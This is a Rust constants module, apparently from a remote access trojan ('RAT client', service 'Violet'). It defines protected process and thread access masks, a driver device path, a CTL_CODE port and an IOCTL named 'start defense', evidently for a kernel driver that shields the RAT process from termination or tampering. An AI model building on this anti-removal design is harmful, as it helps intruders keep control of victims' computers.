pub mod kernel;
pub mod utils;

use const_format::formatcp;
use widestring::{U16CStr, u16cstr};
use windows_sys::Win32::System::Ioctl::{FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED};
use windows_sys::Win32::System::Threading::{
    PROCESS_CREATE_THREAD, PROCESS_DUP_HANDLE, PROCESS_SET_QUOTA, PROCESS_SUSPEND_RESUME,
    PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
    THREAD_SET_THREAD_TOKEN, THREAD_SUSPEND_RESUME, THREAD_TERMINATE,
};

pub const RAT_CLIENT_SERVICE_NAME: &str = "Violet";
pub const PROCESS_PROTECTED_ACCESS: u32 = PROCESS_CREATE_THREAD
    | PROCESS_DUP_HANDLE
    | PROCESS_SET_QUOTA
    | PROCESS_SUSPEND_RESUME
    | PROCESS_TERMINATE
    | PROCESS_VM_OPERATION
    | PROCESS_VM_WRITE;
pub const THREAD_PROTECTED_ACCESS: u32 =
    THREAD_SET_CONTEXT | THREAD_SET_THREAD_TOKEN | THREAD_SUSPEND_RESUME | THREAD_TERMINATE;
pub const DRIVER_USER_OBJECT: &U16CStr = u16cstr!(formatcp!("\\\\.\\{RAT_CLIENT_SERVICE_NAME}"));

/// Port of the [`CTL_CODE`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code) macro.
///
/// See also: <https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes>
const fn _ctl_code(device_type: u32, function: u32, method: u32, access: u32) -> u32 {
    (device_type << 16) | (access << 14) | (function << 2) | method
}

pub const IOCTL_START_DEFENSE: u32 =
    _ctl_code(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS);
